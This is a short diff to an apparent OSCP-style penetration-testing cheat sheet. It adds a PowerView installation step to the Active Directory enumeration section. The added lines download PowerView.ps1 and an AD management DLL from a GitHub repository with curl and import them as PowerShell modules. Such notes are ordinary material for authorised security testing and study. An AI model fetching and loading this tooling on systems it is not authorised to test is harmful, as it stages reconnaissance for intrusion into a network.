@@ -88,6 +88,15 @@ Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessI
 ```
 
 ## ACTIVE DIRECTORY ENUMERATION
+
+##### POWERVIEW INSTALLATION
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
+curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
+import-module .\Microsoft.ActiveDirectory.Management.dll
+import-module .\PowerView.ps1
+```
+
 ##### LIST - FOREST
 ```
 $MyForest = [System.DirectoryServices.ActiveDirectory.Forest]
